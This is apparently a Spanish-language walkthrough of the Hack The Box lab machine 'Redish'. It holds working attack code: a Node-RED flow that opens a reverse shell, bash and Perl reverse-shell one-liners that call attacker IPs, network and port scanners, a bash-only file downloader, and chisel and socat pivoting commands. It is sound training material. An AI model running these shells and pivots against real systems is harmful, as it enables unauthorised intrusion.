# Redish

## NMAP

![image](https://github.com/gecr07/RedishHTB/assets/63270579/325411cf-e1b7-49a2-b667-067b49606bb8)

![image](https://github.com/gecr07/RedishHTB/assets/63270579/911975ed-cde7-47ac-8df7-904c60b548c9)

Ahora (no hubiera sabido como la verdad) visitamos el link.

> http://10.10.10.94:1880/red/e72c52ec2ba93670b5b9fcc018afcdff

![image](https://github.com/gecr07/RedishHTB/assets/63270579/e38e48cf-9265-49b5-a93c-1bd6a15f2ffb)

Para la shell reversa se usa:

```
[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.14.126","port":"9999","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]

```

Una vez dentro pues nos damos cuenta que la shell esta muy precaria ( y asi lo hacen todos los writes que he visto nos mandamos otro shell


```
[object Object]bash -c "bash -i >& /dev/tcp/10.10.14.28/1234 0>&1"
```

![image](https://github.com/gecr07/RedishHTB/assets/63270579/484e0234-1c4e-4ba5-b818-23bd4fb61d5a)

## Descubrimiento de IPs vivas.

```
#!/bin/bash

echo "Hola estoy dentro"

networks=(172.18.0 172.19.0)



for  network in ${networks[@]}; do
echo "[+] Estoy escaneo  la red $network.0/24"
for i in $(seq 1 254); do

        timeout 1 bash -c "ping -c 1  $network.$i" &>/dev/null && echo -e "\t\t [+] La ip $network.$i -ACTIVE" &

done;wait 
done

echo "Este es el final"


```

## Puertos Abiertos

```
#!/bin/bash

echo "Hola estoy dentro"

hosts=(172.18.0.1 172.18.0.2 172.19.0.1 172.19.0.2 172.19.0.3 172.19.0.4)



for  host in ${hosts[@]}; do
echo -e "\n [+] Estoy escaneo  la red $host"
for port in $(seq 1 10000); do

        timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2>/dev/null && echo -e "\t [+] Port $port - OPEN" &

done;wait 
done

echo "Este es el final"


```
Cabe destacar que el puerto 1880 fue por donde entramos del nodered s4vitar dice que lo mas probable es que le aga un forwad y lo exponga hacia afuera. Tambien es importante destacar como subirmos esos scripts.

```
cat ports.sh| base64 -w0 | xclip -sel clip
 base64  ports.sh -w0 | xclip -sel clip # es completamente lo mismo.
```

Con la opcion -w0 nos imprime todo sin saltos de linea y da menos error intentar usar este en la medida de lo posible.

## Alternativa

O bien si queremos subir el nmap y no existe nada no hay nc no python no wget no curl existen funciones de wget y curl que permiten descargar incluso archivos creadas completamente con bash.

> https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et

```
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
```


Su uso 

```
__curl http://IP/archivo > archivo

```

# Compilar y bajar de peso el chisel

![image](https://github.com/gecr07/RedishHTB/assets/63270579/847ec256-cfc7-4250-a480-2e1d89d641af)

```
go build .
du -hc chisel # Pesa 12 MB
sudo go build -ldflags "-s -w" .
sudo upx chisel 
du -hc chisel # pesa 3 MB!!!

```

## CHISEL PortForwarding

Entonces chisel funciona asi la maquina Kali va a ser el servidor y la maquina victima e cliente.


Cliente (victima)
```
./chisel client 10.10.14.11:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6373

chisel client IPKALI:1234 R:80:IP_adondequeremosllegar:80
                          El puerto 80 de este equipo se convierta en el puerto 80 de mi equipo.
Y no acaba ahi puedes meterle multiples puertos

chisel client IPKALI:1234 R:80:IP_adondequeremosllegar:80 R:6379:172.19.0.2:6379
Lo ulitmo le dice el puerto 6379 de la ip quiero que se convierta en el puero 6379 de mi computadora.
```

Servidor (Kali)
```
chisel server --reverse -p 1234
```

Y lo magico es que entonces puedes escanear con nmap porque entonces ahora nada mas especifica el puerto

```
nmap -sCV -p6379 127.0.0.1 
```


![image](https://github.com/gecr07/RedishHTB/assets/63270579/1090c4b9-0272-4897-afca-29f4885cb455)


Ahora en la pagina que encontramos encontramos rutas. ( por lo menos S4vitar de pregunto y si esas rutas estan dentro de /var/www/html/ruta y asi fue el razonamiento)

![image](https://github.com/gecr07/RedishHTB/assets/63270579/9253e88b-d334-4f05-ad47-58d2a963f556)

Entonces vamos a hacktricks y leemos que existe una manera de lograr RCE.

## PIVOTING (sotcat)


```

Nodered ( hostname)

eth0  (interfaz de Nodered) 172.18.0.2/16

        [+] Host 172.18.0.2 -ACTIVE <- (Nodered) [PWNED]
               [+] Port 1880 - OPEN
        [+] Host 172.18.0.1 -ACTIVE <- Maquina Host
               [+] Port 1880 - OPEN


eth1 (interfaz de Nodered) 172.19.0.4/16

      [+] La ip 172.19.0.4 -ACTIVE <- (Nodered) [PWNED] -> 1111 -> ./socat TCP-LISTEN:1111,fork TCP:10.10.14.11:2222 &

               [+] Port 1880 - OPEN
      [+] La ip 172.19.0.3 -ACTIVE (hints) == Tenenmos ejecucion de comandos mediante web shell (pero no podemos tener conectividad con Kali solo la IP del segmento)
               [+] Port 80 - OPEN
      [+] La ip 172.19.0.2 -ACTIVE ( redis) ==
               [+] Port 6379 - OPEN


      [+] La ip 172.19.0.1 -ACTIVE <- Maquina Host

```

Entonces tenemos la  172.19.0.4 PWNED desde el incio y logramos comand execution en la 172.19.0.3 ( que a su vez tiene ips nuevas que no habiamos visto osea alcanza otras redes). Ahora lo que vamos a hacer para poder
seguir es mandarnos una reverse shell a la  172.19.0.4 (que si tiene conectividad porque estan en el mismo segmento) OJO y es aqui donde pusimos el SOTCAT que redirige todo el trafico del puerto 1111 a la IP_KALI por el 
puerto 2222 y bum tenemos una shell en Kali y ahora podemos alzar otras redes.

Cabe destacar que tomamos un binario estatico del mismo repo del nmap este:

> https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

```
./socat TCP-LISTEN:1111,fork TCP:10.10.14.11:2222 & #Por cierto que dejamos corriendo en segundo plano

```
A y para la shell usamos una de perl y pusimos %26 en lugar de & (url encode) para que no nos diera problemas.

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![image](https://github.com/gecr07/RedishHTB/assets/63270579/2f00b438-928b-4ea7-9d01-eb32cc1f5671)

Esta es la Ip que nosotros veiamos 172.19.0.3 y en la imagen puedes ver que hay otra de otro segmento escondido para nosotros.



Ahora no se puede hacer nada ni ver la flag asi que necesitamos escalar privilegios usamos:

```
#!/bin/bash

old_process=$(ps -eo command)


while true; do 
        new_process=$(ps -eo command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "command|procmon"
        old_process=$new_process
done

```

![image](https://github.com/gecr07/RedishHTB/assets/63270579/76cff56c-b1ea-4f6a-8862-9722a7d467c7)



















































































